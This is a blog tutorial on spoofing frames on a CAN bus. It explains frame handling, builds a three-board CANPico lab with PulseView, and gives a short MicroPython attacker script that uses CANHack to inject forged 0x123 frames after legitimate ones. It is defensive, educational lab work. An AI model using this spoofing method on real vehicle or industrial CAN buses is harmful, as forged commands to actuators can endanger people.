---
layout: single
title: "CAN Frames Spoofing"
date: 2023-12-02
categories: [Network Protocols]
tags: [can-bus, automotive, frame-spoofing, network]
author_profile: true
toc: true
toc_sticky: true
read_time: true
show_date: true
---

## Introduction
Controller Area Network (CAN) is a communication protocol developed by Robert Bosch and standardized as ISO 11898-1 and ISO 11898-2. It is utilized in various industries, including automotive, railway, industrial automation, and many more. Despite its widespread usage and advantages, it raises certain security concerns. For instance, CAN frames are broadcasted to all nodes on the network. This means that a malicious component can passively sniff on all communications or actively send packets to any other node on the network.

In this article, we will explore and experiment with frame spoofing in a CAN bus environment. However, before proceeding with this attack, let's discuss how applications usually handle CAN frames.

 
 ## Applications Handling CAN frames
When a CAN frame is received by a microcontroller, the CAN ID is processed through a hardware mechanism known as the 'ID Acceptance Filter Table' Each node on a CAN bus typically has an ID acceptance filter table, which, in simple terms, is a list of specific CAN IDs that the node is programmed to accept or reject. Therefore, if the frame passes this comparison, it is forwarded to the receiving side. However, if it fails to meet the acceptance criteria, the frame is discarded.

Accepted CAN frames are stored in a receive buffer, often implemented as a First-In-First-Out (FIFO) structure. The CAN software stack is typically notified of the available frames in the buffer either by raising an interrupt or through software polling. By examining the buffer, the CAN software stack extracts relevant information from the frames and stores them in global variables. The application, running in a loop, reads the global variables to determine the most updated values and makes decisions on various activities based on these values.

In summary, when a CAN frame is received, it results in updates to the global variables within the application.

![alt text](https://raw.githubusercontent.com/masjadaan/TechSecurityArticles/main/NetworkProtocols/CANBus/FrameSpoofing/images/HandlingCANFrames.png)


## Spoofing Attack
Our objective in the spoofing attack is to rapidly overwrite the global variables so that when the application accesses them, it retrieves our manipulated values instead of the legitimate values. However, even though spoofing CAN messages is simple, timing is crucial because standards dictate that no two CAN frames with the same ID can enter into arbitration simultaneously if they have different data (this might lead to an Error Doom Loop attack, a topic that may be explored in another article). Therefore, we aim to send the spoofed CAN frame immediately after the original frame (queue the spoofed frame for arbitration right after the completion of the legitimate frame). However, there are some situations where this might not be possible; for instance, when higher-priority frames may have been queued after the original frame has been sent.

To observe this attack in action, we need some hardware. In my personal CAN lab, I use the CANPico boards developed by Canis Labs. In the next section, I will explain step-by-step how to set up your CAN lab.

## Lab Setup

For our setup, we will use three CANPico boards to replicate a scenario where a sender and receiver communicate on the CAN bus while an attacker is also connected to the same bus. Furthermore, we will connect a Logic Analyzer to the Attacker board as depicted in the image below.

![alt text](https://raw.githubusercontent.com/masjadaan/TechSecurityArticles/main/NetworkProtocols/CANBus/FrameSpoofing/images/LabSetup.png)

### 1. CANPico Board
The CANPico board is designed to be placed on top of the Raspberry Pi Pico. It features an enhanced CAN controller (MCP2517FD) and CAN transceiver. The board comes with an open-source SDK for MicroPython that incorporates the CANHack toolkit API. The Canis Lab documentation mentions "The CANHack software is provided as generic C that ‘bit bangs’ the TX pin using spin loops. It has been ported to the RP2040 microcontroller in the Raspberry Pi Pico and been wrapped with a Python API in custom MicroPython firmware for the Raspberry Pi Pico. The generic C and the MicroPython API code are available in the Canis Labs [repository](https://github.com/kentindell/canhack)"

This CANHack toolkit API enables the execution of low-level attacks on the CAN protocol, which we will use in our domestation later on. For more details, please visit the official website of [Canis Labs](https://canislabs.com/). The following is the pin diagram and the pins for connecting a logic analyzer.

![alt text](https://raw.githubusercontent.com/masjadaan/TechSecurityArticles/main/NetworkProtocols/CANBus/FrameSpoofing/images/PinDiagram.png)

### 2. Thonny
Thonny is a free and open-source Python IDE. It will be our tool for writing Python code to program the sender, receiver, and attacker nodes. It can be easily installed by running the following command:
```bash
apt install thonny
```


### 3. Connecting The Boards
Now it is time to connect the boards to your computer via the micro USB to USB connection. Each CANPico board comes with two serial lines (/dev/ttyACMx, /dev/ttyACMy). Let's start by connecting the Attacker board to our computer and run the following command:
```sh
ls -l /dev/ttyACM*
crw-rw---- 1 root dialout 166, 0 Aug 10 10:19 /dev/ttyACM0
crw-rw---- 1 root dialout 166, 1 Aug 10 10:19 /dev/ttyACM1
```

From the output of ls command, we see that our computer has recognized the Attacker board, we are interested in "/dev/ttyACM0." We are now prepared to run and configure the Thonny IDE by following these steps:
```
thonny
# Tools -> Option -> Interpreter -> MicroPython (Raspberry Pi Pico) and Port -> /dev/ttyACM0
```
![alt text](https://raw.githubusercontent.com/masjadaan/TechSecurityArticles/main/NetworkProtocols/CANBus/FrameSpoofing/images/Thonny_ttyACM.png)

If everything proceeds as expected, you should establish a connection and view the MicroPython version.

![alt text](https://raw.githubusercontent.com/masjadaan/TechSecurityArticles/main/NetworkProtocols/CANBus/FrameSpoofing/images/Thonny_MicroPython.png)

Let's perform the same steps for the Sender board, connect it first to your computer
```
ls -l /dev/ttyACM*
crw-rw---- 1 root dialout 166, 0 Aug 10 10:29 /dev/ttyACM0
crw-rw---- 1 root dialout 166, 1 Aug 10 10:19 /dev/ttyACM1
crw-rw---- 1 root dialout 166, 2 Aug 10 10:31 /dev/ttyACM2
crw-rw---- 1 root dialout 166, 3 Aug 10 10:31 /dev/ttyACM3
```

Run and configure Thonny IDE for Sender  board
```
thonny
# Tools -> Option -> Interpreter -> MicroPython (Raspberry Pi Pico) and Port -> /dev/ttyACM2
```

Finaly, again the same steps for the Receiver Board
```
ls -l /dev/ttyACM*                   
crw-rw---- 1 root dialout 166, 0 Aug 10 10:29 /dev/ttyACM0
crw-rw---- 1 root dialout 166, 1 Aug 10 10:19 /dev/ttyACM1
crw-rw---- 1 root dialout 166, 2 Aug 10 10:32 /dev/ttyACM2
crw-rw---- 1 root dialout 166, 3 Aug 10 10:31 /dev/ttyACM3
crw-rw---- 1 root dialout 166, 4 Aug 10 10:35 /dev/ttyACM4
crw-rw---- 1 root dialout 166, 5 Aug 10 10:35 /dev/ttyACM5
```

Run and configure Thonny IDE for Receiver board 
```
thonny
# Tools -> Option -> Interpreter -> MicroPython (Raspberry Pi Pico) and Port -> /dev/ttyACM4
```

At this point, we are prepared to write Python code. However, let's first configure Pulseview.


### 4. Logic Analyzer (Pulseview)
PulseView is a graphical logic analyzer designed for sigrok. It has various protocol decoders, including one for the CAN protocol. You can download it as [AppImage](https://sigrok.org/download/binary/pulseview/PulseView-0.4.1-x86_64.AppImage)
```sh
cd /hackTools/logicAnalyzer/pulseview
wget https://sigrok.org/download/binary/pulseview/PulseView-0.4.1-x86_64.AppImage
chmod +x PulseView-0.4.1-x86_64.AppImage
pulseview

# you might need to install fuse
sudo apt-get install fuse
```

First of all, let's start by using two wire jumpers: one to connect CH1 on the Logic Analyzer to the Tx pin on the CANPico Attacker board, and the other to connect CH2 on the Logic Analyzer to the Rx pin on the CANPico Attacker board.

Once the physical connections are in place, the next step is to configure PulseView to align with our specific environment. After launching PulseView, ensure that the Saleae Logic option is selected.

![alt text](https://raw.githubusercontent.com/masjadaan/TechSecurityArticles/main/NetworkProtocols/CANBus/FrameSpoofing/images/Saleae.png)


Since our focus is solely on channels D0 and D1, thus we can disable all channels and select only D0 and D1, then close the windows.

![alt text](https://raw.githubusercontent.com/masjadaan/TechSecurityArticles/main/NetworkProtocols/CANBus/FrameSpoofing/images/DoD1.png)


On the left panel, click on "D0" and rename it to CAN Tx. In addition, click on D1 and rename it to CAN Rx then set the trigger to a `Falling Edge` and close the window.

![alt text](https://raw.githubusercontent.com/masjadaan/TechSecurityArticles/main/NetworkProtocols/CANBus/FrameSpoofing/images/CANTx.png)
<br>
![alt text](https://raw.githubusercontent.com/masjadaan/TechSecurityArticles/main/NetworkProtocols/CANBus/FrameSpoofing/images/CANRx.png)

Navigate to the decoder button, search for the CAN protocol decode, and add it.

![alt text](https://raw.githubusercontent.com/masjadaan/TechSecurityArticles/main/NetworkProtocols/CANBus/FrameSpoofing/images/decoder.png)


You will see a green CAN symbol on the left panel; click on it and apply the following configuration: set CAN RX to CAN Rx, set the bitrate to 500,000, and configure the Sample point to 75% as depected in image below.

![alt text](https://raw.githubusercontent.com/masjadaan/TechSecurityArticles/main/NetworkProtocols/CANBus/FrameSpoofing/images/CANDecoder.png)

To ensure proper framing, set the pre-trigger to 20% to accommodate idle time before the start of a frame.

![alt text](https://raw.githubusercontent.com/masjadaan/TechSecurityArticles/main/NetworkProtocols/CANBus/FrameSpoofing/images/preTrigger.png)

One last thing is to set is the sampling rate, which is the number of samples taken from an analog signal within a specific time interval measured by Hertz (Hz). Let's choose 16MHz with a total of 50k samples, providing a 3-second window for a complete CAN frame.

![alt text](https://raw.githubusercontent.com/masjadaan/TechSecurityArticles/main/NetworkProtocols/CANBus/FrameSpoofing/images/sampleRate.png)

Now let's put everthing together, and our final setup looks like this:

![alt text](https://raw.githubusercontent.com/masjadaan/TechSecurityArticles/main/NetworkProtocols/CANBus/FrameSpoofing/images/FinalSetup.png)

## Executing Frame Spoofing Attack
As we discussed earlier, we're going to set up three CANPico nodes: one for sending, one for receiving, and one for attacking. Now, let's dive into the sender node. First things first, we initialize the CAN controller. After that, we create a CAN frame with an ID of 0x123 and data set as "AA". To send this frame on the bus, we use a simple for loop, sending it out with a one-second delay between each frame. Take a look at the code snippet below:
```python
# Sender
# initialize CAN controler
from time import sleep
from rp2 import *
c = CAN()

frame = CANFrame(CANID(0x123), data=b'AA')
for _ in range(1, 10):
    c.send_frame(frame)
    sleep(1)
```


Moving on to the receiver node, Like the sender, it starts by initializing the CAN conroler. Then, the node continuously monitors the CAN bus for incoming frames, and printing them on the standard output.
```python
# Receiver
# initialize CAN controler
from rp2 import *
c = CAN()

# continuously monitoring CAN bus
while True: 
	frame = c.recv()
	if len(frame) > 0:
		print(frame)
```


Regarding the attacker node, we start by initializing the CANHack toolkit (the default bit rate is 500K) which will actively monitor the CAN bus. Once the desired frame to be spoofed is detected on the bus, the attacker node sends the spoofed frame to the target. 
```python
# Attacker
# Initializes the CANHack toolkit ( bit_rate is one of 500, 250, or 125)
from rp2 import *
ch = CANHack()

# set up a CAN frame
ch.set_frame(can_id=0x123, data=b'BB')
ch.print_frame()

# Spoof Frame attack
while True:
    ch.spoof_frame()
```

To initiate the attack, follow these steps in sequence:

1. Begin by executing the code in the receiver node (press the green triangular button).
2. Secondly, run the code in the sender node.
3. Before executing the attacker code, navigate to the Pulseview panel and click on "run" to start capturing frames.
4. Finally, execute the attacker code.

Upon completion of these steps, you should get a result similar to the image depicted below.

![alt text](https://raw.githubusercontent.com/masjadaan/TechSecurityArticles/main/NetworkProtocols/CANBus/FrameSpoofing/images/Attack.png)

Let's examine the current scenario: the sender intends to transmit a CAN message with a CAN ID of 0x123 and data "AA." However, an attacker node, connected to the same bus, is consistently monitoring the CAN bus for this specific CAN ID. Upon detecting the intended message, the attacker node immediately sends a CAN message with the same ID but different data, namely "BB". By looking at the receiver node, we observe that both messages has arrived, with timestamps that are very close to each other.

This is the essence of a basic CAN message spoofing attack and it occurs because distinguishing the origin of a frame, whether it's from a legitimate node or an attacker node, is inherently challenging. In such a scenario, the application may retrieve the "BB" data instead of the legitimate "AA" data. One can think of this data as a command for an actuator or information from a sensor, among other possibilities.

Happy Learning... <br>
Mahmoud Jadaan

## Test Environment
### Hardware
- CANPico boards
- Logic Analyzer (Saleae Logic)

### Software
- Kali Linux (6.5.0-kali3-amd64)
- Thonny
- PulseView

